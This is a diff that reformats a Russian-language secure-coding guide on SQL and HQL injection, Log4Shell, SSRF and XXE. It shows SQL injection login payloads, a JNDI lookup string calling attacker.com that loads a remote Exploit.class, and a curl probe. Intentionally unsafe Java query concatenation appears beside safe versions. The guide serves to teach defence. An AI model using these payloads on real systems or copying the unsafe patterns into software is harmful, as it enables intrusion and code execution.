@@ -689,7 +689,7 @@ URL – запрос имеет следующий вид:
 
 **Запрос**: `http://money.cbr.ru/logon?login=user' or '1'='1&passwd=null' or '1'='1`
 
-SQL – код: `SELECT * FROM users WHERE userName ='user’ OR '1' = '1' AND password='null' OR '1' = '1'`
+**SQL – код**: `SELECT * FROM users WHERE userName ='user’ OR '1' = '1' AND password='null' OR '1' = '1'`
 
 **Результат:**
 
@@ -697,17 +697,17 @@ SQL – код: `SELECT * FROM users WHERE userName ='user’ OR '1' = '1' AND p
 
 2) Присоединение к запросу результатов другого запроса. Делается это через оператор UNION.
 
-`http://money.cbr.ru/logon?login=null&passwd=null ' UNION SELECT * FROM users WHERE '1'='1`
+**Запрос**: `http://money.cbr.ru/logon?login=null&passwd=null ' UNION SELECT * FROM users WHERE '1'='1`
 
-`SELECT * FROM users WHERE userName ='null' AND PASSWORD='null' UNION SELECT * FROM users`
+**SQL – код**: `SELECT * FROM users WHERE userName ='null' AND PASSWORD='null' UNION SELECT * FROM users`
 
 Результат – успешный доступ к информации (аналогично рисунку 1).
 
 3) Закомментирование части запроса.
 
-`http://money.cbr.ru/logon?login=user' -- &passwd=null`
+**Запрос**: `http://money.cbr.ru/logon?login=user' -- &passwd=null`
 
-`SELECT * FROM users WHERE userName = 'user' -- ' AND password = 'null'`
+**SQL – код**: `SELECT * FROM users WHERE userName = 'user' -- ' AND password = 'null'`
 
 Результат – получен доступ к записи без указания пароля:
 
@@ -968,8 +968,8 @@ public List<Product> findByName_HQL_unsafe(String name) {
 ```
 
 #### *Пример 2. Небезопасное использование HQL*
-В данном примере SQL запрос строится при помощи конкатенации строк. Используется перегруженный метод <T> TypedQuery<T>
-createQuery(String var1, Class<T> var2)
+В данном примере SQL запрос строится при помощи конкатенации строк. Используется перегруженный метод `<T> TypedQuery<T>
+createQuery(String var1, Class<T> var2)`
 ```java
 @Autowired
 private EntityManager em;
@@ -983,7 +983,7 @@ public List<Product> findProductByClassName_HQL_unsafe(String name) {
 ```
 
 #### *Пример 3. Небезопасное использование HQL*
-В данном примере SQL запрос строится при помощи конкатенации строк с использованием org.hibernate.Session:
+В данном примере SQL запрос строится при помощи конкатенации строк с использованием `org.hibernate.Session`:
 ```java
 private static final String HQL_UNSAFE = "FROM Product t WHERE t.name='";
 
@@ -1220,8 +1220,7 @@ JNDI, или же Java Naming and Directory Interface, представляет 
 JNDI нужен для того, чтобы мы могли из Java-кода получить Java-объект из некоторой "Регистратуры" объектов по его имени.
 Из популярных примеров служб имен и каталогов (поддерживаемые JNDI) можно выделить LDAP, DNS, RMI и т.д.
 Атака сводится к передаче строки с подстановкой `${jndi:ldap://attacker.com/a}`, при обработке которой Log4j 2 отправит
-на сервер attacker.com LDAP-запрос пути к Java-классу. Возвращённый сервером атакующего путь (
-например, http://second-stage.attacker.com/Exploit.class) будет загружен и выполнен в контексте текущего процесса, что
+на сервер attacker.com LDAP-запрос пути к Java-классу. Возвращённый сервером атакующего путь (например, http://second-stage.attacker.com/Exploit.class) будет загружен и выполнен в контексте текущего процесса, что
 позволяет атакующему добиться выполнения произвольного кода в системе с правами текущего приложения.
 
 ![cwe-94_2.png](readme_img/cwe-94_2.png)
@@ -1285,7 +1284,7 @@ curl localhost:8080/ -H 'X-Api-version: ${java:version}'
 * Java приложение использует log4j (Maven package log4j-core) версии 2.0.0-2.12.1 или 2.13.0-2.14.1
     * Версия 2.12.2 не подвержена уязвимости, так как получила исправления, перенесенные из версии 2.16.0.
 * Злоумышленник может вызвать запись в журнал произвольных строк с помощью одного из API протоколирования –
-  logger.info(), logger.debug(), logger.error(), logger.fatal(), logger.log(), logger.trace(), logger.warn().
+  `logger.info()`, `logger.debug()`, `logger.error()`, `logger.fatal()`, `logger.log()`, `logger.trace()`, `logger.warn()`.
 * Никаких специфических для Log4j мер по исправлению уязвимости не применяется (см. раздел “Mitigations”
   в https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/):
     * Отключение lookups
@@ -1620,8 +1619,7 @@ Server-Side Request Forgery — это дефект безопасности, к
 Стоит отметить:
 
 * SSRF не ограничивается протоколом HTTP. Как правило, первым запросом является HTTP, но в случаях, когда приложение
-  само выполняет второй запрос, оно может использовать различные протоколы (например, FTP, SMB, SMTP и т. д.) и схемы (
-  например, file://, dict://, sftp://, ldap://, tftp://, gopher:// и т. д.).
+  само выполняет второй запрос, оно может использовать различные протоколы (например, FTP, SMB, SMTP и т. д.) и схемы (например, `file://`, `dict://`, `sftp://`, `ldap://`, `tftp://`, `gopher://` и т. д.).
 * Если приложение уязвимо к инъекции XML eXternal Entity (XXE), то это может быть использовано для проведения
   SSRF-атаки.
 
@@ -1680,8 +1678,8 @@ https://0xn3va.gitbook.io/cheat-sheets/web-application/server-side-request-forge
 
 4. Не отправляйте необработанное тело ответа от сервера клиенту
 5. Принудительно используйте только необходимые схемы URL:
-   Разрешите только те схемы URL, которые использует ваше приложение. Нет необходимости разрешать ftp://, file:/// или
-   даже http://, если вы используете только https://;
+   Разрешите только те схемы URL, которые использует ваше приложение. Нет необходимости разрешать `ftp://`, `file:///` или
+   даже `http://`, если вы используете только `https://`;
 6. Включайте аутентификацию для всех служб:
    Убедитесь, что аутентификация включена для всех служб, работающих в вашей сети.
 
@@ -2547,7 +2545,7 @@ public void addUserUnsafe(@RequestBody LoginForm loginForm, HttpServletResponse 
 }
 ```
 
-#### *Пример 2. Добавление пользователя в XML документ при помощи javax.xml.bind.Marshaller*
+#### *Пример 2. Безопасное добавление пользователя в XML документ при помощи javax.xml.bind.Marshaller*
 В данном примере из введенных пользователем данных создается объект User (pojo), добавляется в общий список Users, который затем сериализуется в XML и сохраняется в файл. Marshaller по умолчанию экранирует все спец. символы.
 ```java
 @PostMapping(value = "add-user-safe",
@@ -2574,7 +2572,7 @@ public void addUserSafe(@RequestBody LoginForm loginForm, HttpServletResponse re
 }
 ```
 
-#### *Пример 3. Экранирование пользовательского ввода*
+#### *Пример 3. Безопасное экранирование пользовательского ввода*
 В данном примере все символы из введенного пользователем логина, пароля (его md5 hash) и email экранируются перед подстановкой в XML строку.
 ```java
 @PostMapping(value = "add-user-safe-escape",
@@ -2779,7 +2777,7 @@ ENTITIES могут использоваться для определения D
         ]>
 ```
 
-Эти объекты можно было использовать только внутри структуры XML. Однако есть нечто, называемое сущностями параметров, которые можно определять или вызывать внутри самого DOCTYPE. Они обозначаются символом «%», за которым следует имя объекта.  
+Эти объекты можно было использовать только внутри структуры XML. Однако есть нечто, называемое сущностями параметров, которые можно определять или вызывать внутри самого DOCTYPE. Они обозначаются символом `%`, за которым следует имя объекта.  
 Источники внедрения XXE - файлы / источники ввода, которые злоумышленник может использовать для внедрения своего вредоносного XML.
 
 * XML
